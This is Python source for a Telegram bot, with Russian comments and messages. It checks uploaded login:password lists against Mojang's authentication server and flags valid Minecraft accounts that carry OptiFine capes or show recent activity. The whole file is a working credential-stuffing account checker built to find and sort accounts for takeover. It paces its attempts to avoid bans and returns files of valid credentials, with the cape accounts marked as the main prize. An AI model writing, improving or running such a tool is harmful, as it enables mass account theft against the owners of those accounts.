import os
import logging
import asyncio
import aiofiles
import requests
import json
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг из переменных окружения
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
stats = {
    'total_checked': 0,
    'valid_accounts': 0,
    'invalid_accounts': 0,
    'cape_found': 0,
    'start_time': datetime.now()
}

class AccountChecker:
    """Проверяльщик аккаунтов"""
    
    @staticmethod
    async def check_account(login, password):
        """Проверка одного аккаунта"""
        session = requests.Session()
        
        try:
            login = login.strip()
            password = password.strip()
            
            # 1. Авторизация в Mojang
            auth_payload = {
                "agent": {
                    "name": "Minecraft",
                    "version": 1
                },
                "username": login,
                "password": password,
                "requestUser": True
            }
            
            auth_req = session.post(
                'https://authserver.mojang.com/authenticate',
                json=auth_payload,
                timeout=30
            )
            
            if auth_req.status_code != 200:
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': f'HTTP {auth_req.status_code}'
                }
            
            auth_data = auth_req.json()
            
            if 'error' in auth_data:
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': auth_data.get('errorMessage', 'Неизвестная ошибка')
                }
            
            if 'selectedProfile' not in auth_data:
                return {
                    'login': login,
                    'status': 'migrated',
                    'error': 'Аккаунт перенесен в Microsoft'
                }
            
            # Получаем данные
            uuid = auth_data['selectedProfile']['id']
            username = auth_data['selectedProfile']['name']
            
            # 2. Проверка плаща OptiFine
            cape_result = await AccountChecker.check_optifine_cape(username)
            
            # 3. Последний вход
            last_login_info = await AccountChecker.get_last_login_info(username)
            
            return {
                'login': login,
                'password': password,
                'username': username,
                'uuid': uuid,
                'status': 'valid',
                'has_cape': cape_result['has_cape'],
                'cape_name': cape_result.get('cape_name'),
                'cape_url': cape_result.get('cape_url'),
                'last_login': last_login_info['last_seen'],
                'activity_level': last_login_info['activity'],
                'servers': last_login_info['servers']
            }
            
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:100]
            }
        finally:
            session.close()
    
    @staticmethod
    async def check_optifine_cape(username):
        """Проверка плаща OptiFine (правильный способ)"""
        
        # Прямая проверка картинки плаща - так работает 100%
        try:
            # Пробуем разные варианты URL
            cape_urls = [
                f"https://optifine.net/capes/{username}.png",
                f"http://optifine.net/capes/{username}.png",
                f"https://s.optifine.net/capes/{username}.png"
            ]
            
            for cape_url in cape_urls:
                try:
                    # Просто проверяем, открывается ли картинка
                    response = requests.get(cape_url, timeout=5, stream=True)
                    
                    if response.status_code == 200:
                        # Проверяем что это PNG
                        content_type = response.headers.get('content-type', '')
                        if 'image' in content_type or 'png' in content_type:
                            # Проверяем размер - если есть плащ, картинка не пустая
                            content_length = int(response.headers.get('content-length', 0))
                            
                            if content_length > 1000:  # Нормальный плащ весит > 1KB
                                logger.info(f"✅ Нашел плащ! {cape_url}")
                                
                                # Пытаемся определить название плаща
                                cape_name = "OptiFine Cape"
                                if "cape" in cape_url.lower():
                                    cape_name = "OptiFine Cape"
                                
                                return {
                                    'has_cape': True,
                                    'cape_name': cape_name,
                                    'cape_url': cape_url
                                }
                except:
                    continue
                    
        except Exception as e:
            logger.error(f"Ошибка при проверке плаща: {e}")
        
        return {'has_cape': False}
    
    @staticmethod
    async def get_last_login_info(username):
        """Инфа о последнем входе"""
        try:
            # Получаем UUID
            uuid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
            uuid_response = requests.get(uuid_url, timeout=5)
            
            if uuid_response.status_code != 200:
                return {
                    'last_seen': 'Неизвестно',
                    'activity': 'Неизвестно',
                    'servers': []
                }
            
            uuid_data = uuid_response.json()
            uuid = uuid_data['id']
            
            # Спрашиваем NameMC
            namemc_url = f"https://api.namemc.com/profile/{uuid}"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            
            response = requests.get(namemc_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                
                if 'lastSeen' in data:
                    last_seen_timestamp = data['lastSeen'] / 1000
                    last_seen = datetime.fromtimestamp(last_seen_timestamp)
                    days_ago = (datetime.now() - last_seen).days
                    
                    # Человеческий текст
                    if days_ago == 0:
                        activity = "🔥 Заходил сегодня"
                    elif days_ago == 1:
                        activity = "✅ Заходил вчера"
                    elif days_ago < 7:
                        activity = f"📅 Был {days_ago} дней назад"
                    elif days_ago < 30:
                        activity = f"💤 Был {days_ago} дней назад"
                    else:
                        activity = f"😴 Давно не заходил ({days_ago} дней)"
                    
                    # Сервера где видели
                    servers = []
                    if 'servers' in data:
                        for server in data['servers'][:3]:
                            if 'name' in server:
                                servers.append(server['name'])
                    
                    last_seen_text = "Сегодня" if days_ago == 0 else f"{days_ago} дней назад"
                    
                    return {
                        'last_seen': last_seen_text,
                        'activity': activity,
                        'servers': servers
                    }
            
            return {
                'last_seen': 'Неизвестно',
                'activity': 'Неизвестно',
                'servers': []
            }
            
        except Exception as e:
            logger.error(f"Ошибка получения last login: {e}")
            return {
                'last_seen': 'Неизвестно',
                'activity': 'Неизвестно',
                'servers': []
            }

async def process_accounts_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    results = {
        'valid': [],
        'with_cape': [],
        'invalid': [],
        'migrated': [],
        'error': []
    }
    
    progress_msg = await update.message.reply_text(
        "🔄 **Начинаю проверку...**\n"
        "⏳ Ща все проверим, подожди немного",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим строки
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    accounts.append((parts[0].strip(), parts[1].strip()))
        
        total = len(accounts)
        
        if total == 0:
            await progress_msg.edit_text(
                "❌ В файле нет нормальных строк с логин:пароль",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        await progress_msg.edit_text(
            f"📊 Нашел {total} аккаунтов\n"
            f"🔄 Погнали проверять...",
            parse_mode=ParseMode.MARKDOWN
        )
        
        start_time = time.time()
        
        for i, (login, password) in enumerate(accounts, 1):
            # Показываем прогресс
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await progress_msg.edit_text(
                    f"📊 Проверено: {i}/{total}\n"
                    f"✅ С плащами: {len(results['with_cape'])}\n"
                    f"⏱ Прошло: {int(elapsed)}с",
                    parse_mode=ParseMode.MARKDOWN
                )
            
            # Проверяем
            result = await AccountChecker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['with_cape'].append(result)
                    stats['cape_found'] += 1
                stats['valid_accounts'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                stats['invalid_accounts'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                stats['invalid_accounts'] += 1
            else:
                results['error'].append(result)
                stats['invalid_accounts'] += 1
            
            stats['total_checked'] += 1
            await asyncio.sleep(0.5)  # Чтоб не забанили
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с валидными
        if results['valid']:
            valid_file = f"valid_accounts_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ Рабочие аккаунты: {len(results['valid'])}"
                )
            os.remove(valid_file)
        
        # Файл с плащами (САМОЕ ГЛАВНОЕ)
        if results['with_cape']:
            cape_file = f"cape_accounts_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OptiFine 🔥\n")
                await f.write("="*50 + "\n\n")
                for acc in results['with_cape']:
                    await f.write(
                        f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Ник: {acc['username']}\n"
                        f"Плащ: {acc.get('cape_name', 'OptiFine Cape')}\n"
                        f"Ссылка: {acc.get('cape_url', 'Не найдена')}\n"
                        f"Последний вход: {acc['last_login']}\n"
                        f"Активность: {acc['activity_level']}\n"
                        f"-"*30 + "\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 НАШЕЛ ПЛАЩИ! {len(results['with_cape'])} штук"
                )
            os.remove(cape_file)
        
        # Файл с битыми
        if results['invalid'] or results['migrated'] or results['error']:
            invalid_file = f"invalid_accounts_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                await f.write("НЕРАБОЧИЕ АККАУНТЫ\n\n")
                
                if results['invalid']:
                    await f.write("Неверный логин/пароль:\n")
                    for acc in results['invalid'][:50]:
                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Ошибка')}\n")
                
                if results['migrated']:
                    await f.write("\nПеренесены в Microsoft:\n")
                    for acc in results['migrated'][:50]:
                        await f.write(f"{acc['login']}:{acc['password']}\n")
                
                if results['error']:
                    await f.write("\nОшибки:\n")
                    for acc in results['error'][:50]:
                        await f.write(f"{acc['login']}:{acc['password']} - {acc.get('error', 'Ошибка')}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"⚠️ Битары: {len(results['invalid']) + len(results['migrated']) + len(results['error'])}"
                )
            os.remove(invalid_file)
        
        # Итог
        elapsed_time = time.time() - start_time
        minutes = int(elapsed_time // 60)
        seconds = int(elapsed_time % 60)
        
        await update.message.reply_text(
            f"✅ **ГОТОВО!**\n\n"
            f"Всего: {total}\n"
            f"✅ Рабочих: {len(results['valid'])}\n"
            f"🔥 С плащами: {len(results['with_cape'])}\n"
            f"❌ Битых: {len(results['invalid'])}\n"
            f"🔄 В Microsoft: {len(results['migrated'])}\n"
            f"⚠️ Ошибок: {len(results['error'])}\n\n"
            f"⏱ Время: {minutes}м {seconds}с",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Показываем плащи если есть
        if results['with_cape']:
            cape_list = "🔥 **СПИСОК ПЛАЩЕЙ:**\n\n"
            for acc in results['with_cape'][:15]:
                cape_list += f"• **{acc['username']}** - {acc.get('cape_name', 'OptiFine')}\n"
                cape_list += f"  📅 {acc['last_login']}\n\n"
            
            if len(results['with_cape']) > 15:
                cape_list += f"... и еще {len(results['with_cape']) - 15}"
            
            await update.message.reply_text(cape_list, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ Что-то пошло не так: {str(e)}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Извини, ты не в списке допущенных")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 Стата", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')],
        [InlineKeyboardButton("📝 Формат", callback_data='format')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👋 Привет, {update.effective_user.first_name}!\n\n"
        f"🔍 Я умею проверять аккаунты Minecraft на наличие плащей OptiFine\n\n"
        f"📥 Просто кинь мне .txt файл с логин:пароль\n\n"
        f"📊 Проверено всего: {stats['total_checked']}\n"
        f"🔥 Найдено плащей: {stats['cape_found']}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **Статистика:**\n\n"
            f"Проверено: {stats['total_checked']}\n"
            f"✅ Рабочих: {stats['valid_accounts']}\n"
            f"❌ Битых: {stats['invalid_accounts']}\n"
            f"🔥 С плащами: {stats['cape_found']}\n\n"
            f"⏱ Работаю: {hours}ч {minutes}мин",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **Как пользоваться:**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Кинь файл сюда\n"
            "4️⃣ Я все проверю и пришлю результат\n\n"
            "⚠️ Важно:\n"
            "• Работают только старые аккаунты Mojang\n"
            "• Microsoft не канают\n"
            "• Файл не больше 5 МБ\n"
            "• Не больше 1000 акков за раз",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif query.data == 'format':
        await query.edit_message_text(
            "📝 **Пример файла:**\n\n"
            "```\n"
            "user1@gmail.com:qwerty123\n"
            "user2@mail.ru:pass123\n"
            "user3@yandex.ru:minecraft2024\n"
            "```\n\n"
            "❌ **Неправильно:**\n"
            "user gmail.com pass (нет :)\n"
            ":password123 (нет логина)\n"
            "user: (нет пароля)",
            parse_mode=ParseMode.MARKDOWN
        )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Стата"""
    uptime = datetime.now() - stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    await update.message.reply_text(
        f"📊 **Статистика:**\n\n"
        f"Проверено: {stats['total_checked']}\n"
        f"✅ Рабочих: {stats['valid_accounts']}\n"
        f"❌ Битых: {stats['invalid_accounts']}\n"
        f"🔥 С плащами: {stats['cape_found']}\n\n"
        f"⏱ Работаю: {hours}ч {minutes}мин",
        parse_mode=ParseMode.MARKDOWN
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Помощь"""
    await update.message.reply_text(
        "❓ **Как пользоваться:**\n\n"
        "1️⃣ Создай .txt файл\n"
        "2️⃣ В каждой строке: логин:пароль\n"
        "3️⃣ Кинь файл сюда\n"
        "4️⃣ Я все проверю и пришлю результат\n\n"
        "📌 Команды:\n"
        "/start - Меню\n"
        "/stats - Статистика\n"
        "/help - Это окно",
        parse_mode=ParseMode.MARKDOWN
    )

async def test_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Тест одного аккаунта"""
    if len(context.args) < 2:
        await update.message.reply_text("👉 Напиши: /test логин пароль")
        return
    
    login = context.args[0]
    password = context.args[1]
    
    msg = await update.message.reply_text(f"🔍 Проверяю {login[:15]}...")
    
    result = await AccountChecker.check_account(login, password)
    
    if result['status'] == 'valid':
        text = f"""
✅ **Аккаунт рабочий!**

👤 Ник: {result['username']}
🆔 UUID: {result['uuid']}

🔥 **Плащ:** {'✅ ЕСТЬ!!!' if result['has_cape'] else '❌ Нет'}
"""
        if result['has_cape']:
            text += f"""
📛 Название: {result['cape_name']}
🔗 Ссылка: {result['cape_url']}
"""
        
        text += f"""
📅 Последний вход: {result['last_login']}
📊 Активность: {result['activity_level']}
"""
        
        await msg.edit_text(text, parse_mode=ParseMode.MARKDOWN)
    else:
        await msg.edit_text(f"❌ Не работает: {result.get('error', 'Хз что')}")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Доступа нет")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Кинь .txt файл, братан")
        return
    
    if document.file_size > 5 * 1024 * 1024:
        await update.message.reply_text("❌ Файл жирный больно (макс 5 МБ)")
        return
    
    try:
        await update.message.reply_text(f"📥 Поймал файл, ща глянем...")
        
        file = await context.bot.get_file(document.file_id)
        file_path = f"temp_{user_id}_{document.file_name}"
        await file.download_to_drive(file_path)
        
        await process_accounts_file(file_path, update, context)
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ Облом: {str(e)}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка ошибок"""
    logger.error(f"Ошибка: {context.error}")
    try:
        if update and update.message:
            await update.message.reply_text("❌ Что-то сломалось, сорян")
    except:
        pass

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ НЕТ ТОКЕНА! Добавь BOT_TOKEN в переменные окружения")
        return
    
    print("="*50)
    print("🚀 Запускаю OptiFine Cape Checker...")
    print(f"📊 Стата: {stats}")
    print(f"👥 Админы: {ADMIN_IDS if ADMIN_IDS else 'Нет админов - бот для всех'}")
    print("="*50)
    
    try:
        application = Application.builder().token(TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("test", test_account))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_error_handler(error_handler)
        
        print("✅ Бот работает! Жду файлы...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        logger.error(f"Фатальная ошибка: {e}")
        print(f"❌ Ошибка: {e}")

if __name__ == '__main__':
    main()